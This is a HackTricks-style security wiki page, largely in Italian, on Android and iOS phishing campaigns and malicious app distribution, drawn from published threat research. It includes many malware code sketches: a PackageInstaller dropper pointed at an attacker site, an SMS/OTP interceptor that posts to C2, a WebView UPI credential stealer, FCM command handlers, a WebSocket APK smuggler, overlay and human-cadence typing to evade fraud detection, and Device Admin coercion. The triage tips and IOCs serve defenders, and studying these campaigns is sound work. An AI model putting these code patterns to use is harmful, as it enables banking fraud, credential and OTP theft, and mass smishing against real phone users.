# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina copre tecniche usate da threat actors per distribuire **malicious Android APKs** e **iOS mobile-configuration profiles** tramite phishing (SEO, social engineering, fake stores, dating apps, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e da altre ricerche pubbliche.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrare decine di domini look-alike (dating, cloud share, car service…).
– Usare parole chiave nella lingua locale ed emoji nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *sia* Android (`.apk`) *sia* le istruzioni di installazione iOS sulla stessa landing page.
2. **First Stage Download**
* Android: link diretto a un APK *unsigned* o di “third-party store”.
* iOS: `itms-services://` oppure link HTTPS semplice a un malicious **mobileconfig** profile (vedi sotto).
3. **Post-install Social Engineering**
* Al primo avvio l'app chiede un **invitation / verification code** (illusione di accesso esclusivo).
* Il codice viene **POSTed over HTTP** al Command-and-Control (C2).
* C2 risponde `{"success":true}` ➜ il malware continua.
* Sandbox / analisi dinamica AV che non inviano mai un codice valido non vedono **nessun comportamento malevolo** (evasion).
4. **Runtime Permission Abuse** (Android)
* Le dangerous permissions vengono richieste solo **dopo** una risposta positiva dal C2:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Le varianti recenti **rimuovono `<uses-permission>` per SMS da `AndroidManifest.xml`** ma lasciano il path di codice Java/Kotlin che legge gli SMS tramite reflection ⇒ abbassa il punteggio statico ma resta funzionale su dispositivi che concedono il permesso tramite abuso di `AppOps` o target vecchi.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 ha introdotto **Restricted settings** per le app sideloaded: i toggle di Accessibility e Notification Listener sono disattivati finché l'utente non consente esplicitamente le restricted settings in **App info**.
* Le pagine di phishing e i dropper ora includono istruzioni UI passo-passo per **allow restricted settings** per l'app sideloaded e poi abilitare Accessibility/Notification access.
* Un bypass più recente consiste nell'installare il payload tramite un flusso **session-based PackageInstaller** (lo stesso metodo usato dagli app store). Android tratta l'app come installata dallo store, quindi Restricted settings non blocca più Accessibility.
* Suggerimento per il triage: in un dropper, cerca `PackageInstaller.createSession/openSession` più codice che porta subito la vittima a `ACTION_ACCESSIBILITY_SETTINGS` o `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* L'app mostra viste innocue (SMS viewer, gallery picker) implementate localmente.
* Nel frattempo esfiltra:
- IMEI / IMSI, phone number
- Dump completo di `ContactsContract` (JSON array)
- JPEG/PNG da `/sdcard/DCIM` compressi con [Luban](https://github.com/Curzibn/Luban) per ridurre la dimensione
- Contenuto SMS opzionale (`content://sms`)
I payload sono **batch-zipped** e inviati via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Un singolo **mobile-configuration profile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per iscrivere il device a una supervisione “MDM”-like.
* Istruzioni di social engineering:
1. Apri Settings ➜ *Profile downloaded*.
2. Tocca *Install* tre volte (screenshot sulla phishing page).
3. Fai trust del unsigned profile ➜ l'attaccante ottiene entitlement per *Contacts* e *Photo* senza App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* I payload `com.apple.webClip.managed` possono **fissare una phishing URL nella Home Screen** con un'icona/etichetta brandizzata.
* I Web Clips possono funzionare in **full-screen** (nasconde la UI del browser) ed essere marcati come **non-removable**, costringendo la vittima a cancellare il profile per rimuovere l'icona.
9. **Network Layer**
* Plain HTTP, spesso su port 80 con header HOST come `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Durante la valutazione del malware, automatizza la fase del codice di invito con Frida/Objection per arrivare al branch malevolo.
* **Manifest vs. Runtime Diff** – Confronta `aapt dump permissions` con `PackageManager#getRequestedPermissions()` runtime; permessi dangerous mancanti sono un red flag.
* **Network Canary** – Configura `iptables -p tcp --dport 80 -j NFQUEUE` per rilevare burst di POST non solidi dopo l'inserimento del codice.
* **mobileconfig Inspection** – Usa `security cms -D -i profile.mobileconfig` su macOS per elencare `PayloadContent` e individuare entitlement eccessivi.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicatori (Generici)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Questo pattern è stato osservato in campagne che abusano di temi legati ai benefici governativi per rubare credenziali UPI indiane e OTP. Gli operatori concatenano piattaforme affidabili per la consegna e la resilienza.

### Catena di delivery attraverso piattaforme affidabili
- YouTube video lure → la description contiene un short link
- Shortlink → sito di phishing GitHub Pages che imita il portale legittimo
- Lo stesso repo GitHub ospita un APK con un falso badge “Google Play” che punta direttamente al file
- Le pagine di phishing dinamiche vivono su Replit; il canale di remote command usa Firebase Cloud Messaging (FCM)

### Dropper con payload incorporato e installazione offline
- Il primo APK è un installer (dropper) che include il vero malware in `assets/app.apk` e invita l’utente a disabilitare Wi‑Fi/mobile data per indebolire il rilevamento cloud.
- Il payload incorporato si installa con un label innocuo (ad es., “Secure Update”). Dopo l’installazione, sia l’installer sia il payload sono presenti come app separate.

Suggerimento di triage statico (grep per payload incorporati):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Scoperta dinamica degli endpoint tramite shortlink
- Il malware recupera da un shortlink un elenco in testo semplice, separato da virgole, di endpoint attivi; semplici trasformazioni di stringa producono il percorso finale della pagina di phishing.

Esempio (sanitizzato):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Raccolta credenziali UPI basata su WebView
- Il passaggio “Make payment of ₹1 / UPI‑Lite” carica un form HTML dell’attaccante dall’endpoint dinamico dentro una WebView e cattura campi sensibili (phone, bank, UPI PIN) che vengono `POST`ati a `addup.php`.

Loader minimale:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagazione e intercettazione SMS/OTP
- Al primo avvio vengono richiesti permessi aggressivi:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- I contatti vengono usati in loop per inviare in massa SMS di smishing dal dispositivo della vittima.
- Gli SMS in arrivo vengono intercettati da un broadcast receiver e caricati con i metadati (mittente, corpo, slot SIM, ID casuale per dispositivo) su `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) come C2 resiliente
- Il payload si registra a FCM; i messaggi push trasportano un campo `_type` usato come switch per attivare azioni (ad es. aggiornare i template di testo per il phishing, alternare i comportamenti).

Esempio di payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contiene un payload secondario in `assets/app.apk`
- WebView carica il pagamento da `gate.htm` e fa exfiltrate su `/addup.php`
- Exfiltrazione SMS su `/addsm.php`
- Fetch di configurazione guidato da shortlink (ad es. `rebrand.ly/*`) che restituisce endpoint CSV
- App etichettate come generiche “Update/Secure Update”
- Messaggi FCM `data` con un discriminatore `_type` in app non fidate

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Gli attacker sostituiscono sempre più spesso i link APK statici con un canale Socket.IO/WebSocket incorporato in lures che sembrano Google Play. Questo nasconde l’URL del payload, bypassa i filtri su URL/estensioni e mantiene un’install UX realistica.

Flusso client tipico osservato sul campo:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Perché aggira i controlli semplici:
- Nessun URL statico APK viene esposto; il payload viene ricostruito in memoria dai frame WebSocket.
- I filtri URL/MIME/estensione che bloccano le risposte .apk dirette possono non rilevare dati binari incapsulati tramite WebSockets/Socket.IO.
- I crawler e le sandbox URL che non eseguono WebSockets non recupereranno il payload.

Vedi anche WebSocket tradecraft e tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Abuso di Android Accessibility/Overlay e Device Admin, automazione ATS, e orchestrazione NFC relay – caso studio RatOn

La campagna banker/RAT RatOn (ThreatFabric) è un esempio concreto di come le moderne operazioni di mobile phishing combinino WebView droppers, automazione UI guidata da Accessibility, overlay/ransom, coercizione Device Admin, Automated Transfer System (ATS), takeover di wallet crypto e persino orchestrazione NFC-relay. Questa sezione astrae le tecniche riutilizzabili.

### Stage-1: WebView → native install bridge (dropper)
Gli attaccanti presentano una WebView che punta a una pagina dell'attaccante e iniettano una JavaScript interface che espone un installer nativo. Un tap su un pulsante HTML richiama codice nativo che installa un APK di second-stage incluso negli asset del dropper e poi lo avvia direttamente.

Pattern minimo:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML nella pagina:
```html
<button onclick="bridge.installApk()">Install</button>
```
Dopo l'installazione, il dropper avvia il payload tramite package/activity espliciti:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: app non affidabili che chiamano `addJavascriptInterface()` ed espongono metodi simili a quelli di un installer a WebView; APK che include un payload secondario incorporato sotto `assets/` e invoca la Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 apre una WebView che ospita una pagina “Access”. Il suo pulsante invoca un metodo esportato che porta la vittima alle impostazioni di Accessibility e richiede di abilitare il rogue service. Una volta ottenuto il consenso, il malware usa Accessibility per fare auto-click sui successivi dialoghi di runtime permission (contacts, overlay, manage system settings, ecc.) e richiede Device Admin.

- Accessibility aiuta programmaticamente ad accettare i prompt successivi trovando pulsanti come “Allow”/“OK” nel node-tree e inviando click.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Gli operatori possono inviare comandi per:
- renderizzare un overlay a schermo intero da un URL, oppure
- passare HTML inline che viene caricato in un overlay WebView.

Usi probabili: coercizione (inserimento del PIN), apertura del wallet per catturare i PIN, messaggi di riscatto. Mantieni un comando per assicurarti che il permesso overlay venga concesso se manca.

### Modello di controllo remoto – pseudo-schermo testuale + screen-cast
- Bassa larghezza di banda: eseguire periodicamente il dump dell'albero dei nodi Accessibility, serializzare i testi/ruoli/bounds visibili e inviarli al C2 come pseudo-schermo (comandi come `txt_screen` una volta e `screen_live` in modo continuo).
- Alta fedeltà: richiedere MediaProjection e avviare screen-casting/recording on demand (comandi come `display` / `record`).

### Playbook ATS (automazione app bancaria)
Dato un task JSON, apri l'app bancaria, guida la UI tramite Accessibility con un mix di query testuali e tap su coordinate, e inserisci il PIN di pagamento della vittima quando richiesto.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Esempi di testi visti in un flusso target (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Gli operatori possono anche verificare/innalzare i limiti di trasferimento tramite comandi come `check_limit` e `limit` che navigano l'UI dei limiti in modo analogo.

### Crypto wallet seed extraction
Target come MetaMask, Trust Wallet, Blockchain.com, Phantom. Flusso: sbloccare (PIN rubato o password fornita), navigare in Security/Recovery, rivelare/mostrare la seed phrase, keylog/exfiltrate it. Implementare selector consapevoli della locale (EN/RU/CZ/SK) per stabilizzare la navigazione tra lingue.

### Device Admin coercion
Le API Device Admin vengono usate per aumentare le opportunità di cattura del PIN e frustrate la vittima:

- Immediate lock:
```java
dpm.lockNow();
```
- Far scadere le credenziali attuali per forzare il cambio (Accessibility cattura il nuovo PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzare lo sblocco non biometrico disabilitando le funzionalità biometriche di keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Molti controlli di DevicePolicyManager richiedono Device Owner/Profile Owner sulle versioni recenti di Android; alcune build OEM potrebbero essere permissive. Valida sempre sull’OS/OEM target.

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors increasingly blend Accessibility-driven automation with anti-detection tuned against basic behaviour biometrics. A recent banker/RAT shows two complementary text-delivery modes and an operator toggle to simulate human typing with randomized cadence.

- Discovery mode: enumerate visible nodes with selectors and bounds to precisely target inputs (ID, text, contentDescription, hint, bounds) before acting.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` directly on the target node (stable, no keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` into the focused node (works when direct setText is blocked).
- Human-like cadence: split the operator-provided string and deliver it character-by-character with randomized 300–3000 ms delays between events to evade “machine-speed typing” heuristics. Implemented either by progressively growing the value via `ACTION_SET_TEXT`, or by pasting one char at a time.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blocco dei overlay per la frode:
- Renderizza un `TYPE_ACCESSIBILITY_OVERLAY` a schermo intero con opacità controllata dall'operatore; mantienilo opaco per la vittima mentre l'automazione remota procede sotto.
- I comandi tipicamente esposti: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay minimale con alpha regolabile:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (condivisione schermo).

## Dropper Android multi-stage con WebView bridge, decodificatore di stringhe JNI e caricamento DEX a stadi

L'analisi di CERT Polska del 03 April 2026 di **cifrat** è un buon riferimento per un moderno loader Android distribuito via phishing in cui l'APK visibile è solo una shell installer. Il tradecraft riutilizzabile non è il nome della famiglia, ma il modo in cui le fasi sono concatenate:

1. La pagina di phishing consegna un APK esca.
2. Lo stage 0 richiede `REQUEST_INSTALL_PACKAGES`, carica un `.so` nativo, decritta un blob incorporato e installa lo stage 2 con **PackageInstaller sessions**.
3. Lo stage 2 decritta un altro asset nascosto, lo tratta come uno ZIP e **carica dinamicamente DEX** per il RAT finale.
4. Lo stage finale abusa di Accessibility/MediaProjection e usa WebSockets per control/data.

### WebView JavaScript bridge come controller dell'installer

Invece di usare WebView solo per un branding finto, l'esca può esporre un bridge che consente a una pagina locale/remota di fingerprintare il dispositivo e attivare la logica nativa di installazione:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Idee di triage:
- grep per `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` e URL di phishing remoti usati nella stessa activity
- osserva bridge che espongono metodi tipo installer (`start`, `install`, `openAccessibility`, `requestOverlay`)
- se il bridge è supportato da una pagina di phishing, trattalo come una superficie operatore/controller, non solo UI

### Decodifica nativa di stringhe registrata in `JNI_OnLoad`

Un pattern utile è un metodo Java che sembra innocuo ma in realtà è supportato da `RegisterNatives` durante `JNI_OnLoad`. In cifrat, il decoder ignorava il primo char, usava il secondo come chiave XOR da 1 byte, faceva il hex-decode del resto e trasformava ogni byte come `((b - i) & 0xff) ^ key`.

Riproduzione offline minimale:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Usa questo quando vedi:
- chiamate ripetute a un solo metodo Java con supporto nativo per URL, nomi di package o chiavi
- `JNI_OnLoad` che risolve classi e chiama `RegisterNatives`
- nessuna stringa in plaintext significativa nel DEX, ma molte costanti corte simili a hex passate a un solo helper

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Questa famiglia usava due layer di unpacking che vale la pena cercare in modo generico:

- **Stage 0**: decrypt `res/raw/*.bin` con una chiave XOR derivata tramite il decoder nativo, poi installa il plaintext APK tramite `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: estrai un asset innocuo come `FH.svg`, decryptalo con una routine RC4-like, interpreta il risultato come un ZIP, poi carica i file DEX nascosti

Questo è un forte indicatore di una vera pipeline dropper/loader perché ogni layer mantiene opaco il successivo stage rispetto a una semplice static scanning.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` più chiamate di sessione `PackageInstaller`
- receiver per `PACKAGE_ADDED` / `PACKAGE_REPLACED` per continuare la chain dopo l'installazione
- blob cifrati sotto `res/raw/` o `assets/` con estensioni non media
- `DexClassLoader` / `InMemoryDexClassLoader` / gestione ZIP vicina a decryptor custom

### Native anti-debugging through `/proc/self/maps`

Il bootstrap nativo scansionava anche `/proc/self/maps` per `libjdwp.so` e abortiva se presente. Questo è un pratico controllo early di anti-analysis perché il debugging basato su JDWP lascia una libreria mappata riconoscibile:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Idee di hunting:
- grep codice nativo / output del decompiler per `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- se i hook di Frida arrivano troppo tardi, ispeziona prima `.init_array` e `JNI_OnLoad`
- tratta anti-debug + string decoder + staged install come un unico cluster, non come finding indipendenti

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
